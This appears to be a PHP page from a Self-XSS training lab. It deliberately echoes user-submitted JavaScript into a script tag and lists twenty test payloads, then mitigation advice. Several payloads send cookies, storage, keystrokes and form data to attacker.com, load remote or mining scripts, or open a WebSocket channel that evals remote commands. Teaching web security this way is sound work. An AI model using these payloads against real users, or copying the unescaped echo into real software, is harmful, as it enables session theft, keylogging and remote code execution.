<?php
// Lab 1: Basic Self-XSS
// Vulnerability: Self-XSS through user input fields

session_start();

$message = '';
$user_input = '';
$executed_code = '';

// Simulate Self-XSS vulnerability
function process_self_xss_input($input) {
    // Vulnerable: Direct output without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}

// Handle Self-XSS
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['execute_code'])) {
    $user_input = $_POST['code_input'] ?? '';
    
    if ($user_input) {
        $executed_code = process_self_xss_input($user_input);
        $message = '<div class="alert alert-success">Code executed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic Self-XSS - Self-XSS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .executed-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .self-xss-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to Self-XSS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic Self-XSS</h1>
            <p class="hero-subtitle">Self-XSS through user input fields</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates a basic Self-XSS vulnerability where users can inject malicious JavaScript that only affects themselves. This typically happens through user input fields that directly execute JavaScript without proper validation.</p>
            <p><strong>Objective:</strong> Execute malicious JavaScript through self-XSS vulnerability.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct output without validation
function process_self_xss_input($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct output without encoding
    return $input;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-terminal me-2"></i>Self-XSS Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="self-xss-warning">
                            <h5>⚠️ Self-XSS WARNING</h5>
                            <p>This lab demonstrates Self-XSS vulnerabilities. The following can execute JavaScript:</p>
                            <ul>
                                <li><code>alert('Self-XSS')</code> - Basic alert</li>
                                <li><code>document.body.style.background='red'</code> - Change background</li>
                                <li><code>console.log('Self-XSS')</code> - Console output</li>
                                <li><code>window.location='https://example.com'</code> - Redirect</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>Self-XSS Examples</h5>
                            <p>Try these basic JavaScript commands:</p>
                            <ul>
                                <li><code>alert('Hello World!')</code> - Show alert</li>
                                <li><code>console.log('Test')</code> - Console output</li>
                                <li><code>document.title = 'Hacked'</code> - Change title</li>
                                <li><code>document.body.innerHTML = 'Hacked!'</code> - Change content</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="execute_code" value="1">
                            <div class="mb-3">
                                <label for="code_input" class="form-label">JavaScript Code to Execute</label>
                                <textarea class="form-control" id="code_input" name="code_input" 
                                          rows="4" placeholder="Enter JavaScript code..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Code</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($executed_code): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Executed Code
                    </div>
                    <div class="card-body">
                        <div class="executed-display">
                            <h5>JavaScript Output</h5>
                            <div class="sensitive-data">
                                <script>
                                    try {
                                        <?php echo $executed_code; ?>
                                    } catch(e) {
                                        console.error('Error executing code:', e);
                                    }
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Self-XSS</li>
                        <li><strong>Severity:</strong> Medium</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct JavaScript execution without validation</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Test Payloads</h5>
                    <ul>
                        <li><code>alert('Self-XSS')</code> - Basic alert</li>
                        <li><code>console.log('Test')</code> - Console output</li>
                        <li><code>document.title = 'Hacked'</code> - Change title</li>
                        <li><code>document.body.innerHTML = 'Hacked!'</code> - Change content</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Self-XSS Payloads</h5>
            <p>Use these payloads to test Self-XSS vulnerabilities:</p>
            
            <h6>1. Basic JavaScript Execution:</h6>
            <div class="code-block">alert('Self-XSS')
console.log('Self-XSS')
document.write('Self-XSS')
window.alert('Self-XSS')</div>

            <h6>2. DOM Manipulation:</h6>
            <div class="code-block">document.body.style.background = 'red'
document.title = 'Hacked!'
document.body.innerHTML = '<h1>HACKED!</h1>'
document.body.style.color = 'white'</div>

            <h6>3. Console Output:</h6>
            <div class="code-block">console.log('Self-XSS Test')
console.error('Self-XSS Error')
console.warn('Self-XSS Warning')
console.info('Self-XSS Info')</div>

            <h6>4. Window Manipulation:</h6>
            <div class="code-block">window.location = 'https://example.com'
window.open('https://example.com')
window.close()
window.resizeTo(800, 600)</div>

            <h6>5. Local Storage:</h6>
            <div class="code-block">localStorage.setItem('xss', 'test')
sessionStorage.setItem('xss', 'test')
localStorage.getItem('xss')
sessionStorage.getItem('xss')</div>

            <h6>6. Cookie Manipulation:</h6>
            <div class="code-block">document.cookie = 'xss=test'
document.cookie = 'xss=test; path=/'
document.cookie = 'xss=test; domain=.example.com'
document.cookie = 'xss=test; secure'</div>

            <h6>7. Form Manipulation:</h6>
            <div class="code-block">var form = document.createElement('form')
form.action = 'https://attacker.com/steal'
form.innerHTML = '<input name="data" value="stolen">'
document.body.appendChild(form)</div>

            <h6>8. Image Injection:</h6>
            <div class="code-block">var img = document.createElement('img')
img.src = 'https://attacker.com/steal?data=' + document.cookie
document.body.appendChild(img)</div>

            <h6>9. Script Injection:</h6>
            <div class="code-block">var script = document.createElement('script')
script.src = 'https://attacker.com/malicious.js'
document.head.appendChild(script)</div>

            <h6>10. Keylogger:</h6>
            <div class="code-block">document.addEventListener('keypress', function(e) {
    console.log('Key pressed:', e.key)
    fetch('https://attacker.com/keys?key=' + e.key)
})</div>

            <h6>11. Form Hijacking:</h6>
            <div class="code-block">var forms = document.getElementsByTagName('form')
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        console.log('Form submitted:', e.target)
        fetch('https://attacker.com/forms', {
            method: 'POST',
            body: new FormData(e.target)
        })
    })
}</div>

            <h6>12. Data Exfiltration:</h6>
            <div class="code-block">var data = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href
}
fetch('https://attacker.com/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
})</div>

            <h6>13. Session Hijacking:</h6>
            <div class="code-block">var sessionData = {
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    url: window.location.href,
    referrer: document.referrer
}
fetch('https://attacker.com/session', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(sessionData)
})</div>

            <h6>14. Cryptocurrency Mining:</h6>
            <div class="code-block">var script = document.createElement('script')
script.src = 'https://attacker.com/miner.js'
document.head.appendChild(script)</div>

            <h6>15. Reverse Shell:</h6>
            <div class="code-block">var ws = new WebSocket('ws://attacker.com:8080')
ws.onopen = function() {
    ws.send('Connected')
}
ws.onmessage = function(event) {
    eval(event.data)
}</div>

            <h6>16. Advanced Persistence:</h6>
            <div class="code-block">var payload = 'alert("Persistent XSS")'
localStorage.setItem('xss', payload)
if (localStorage.getItem('xss')) {
    eval(localStorage.getItem('xss'))
}</div>

            <h6>17. DOM Clobbering:</h6>
            <div class="code-block">var element = document.createElement('div')
element.id = 'xss'
element.innerHTML = '<script>alert("XSS")</script>'
document.body.appendChild(element)</div>

            <h6>18. Event Handler Injection:</h6>
            <div class="code-block">var element = document.createElement('div')
element.onclick = function() { alert('XSS') }
element.innerHTML = 'Click me'
document.body.appendChild(element)</div>

            <h6>19. CSS Injection:</h6>
            <div class="code-block">var style = document.createElement('style')
style.innerHTML = 'body { background: red !important; }'
document.head.appendChild(style)</div>

            <h6>20. Advanced JavaScript:</h6>
            <div class="code-block">(function() {
    var script = document.createElement('script')
    script.src = 'https://attacker.com/malicious.js'
    document.head.appendChild(script)
})()</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Social engineering and user manipulation</li>
                <li>Data theft and sensitive information disclosure</li>
                <li>Session hijacking and account takeover</li>
                <li>Malicious redirects and phishing attacks</li>
                <li>Keylogging and form hijacking</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use Content Security Policy (CSP) to prevent code execution</li>
                    <li>Implement proper output encoding</li>
                    <li>Use whitelist-based filtering for allowed content</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual JavaScript execution patterns</li>
                    <li>Educate users about Self-XSS risks</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
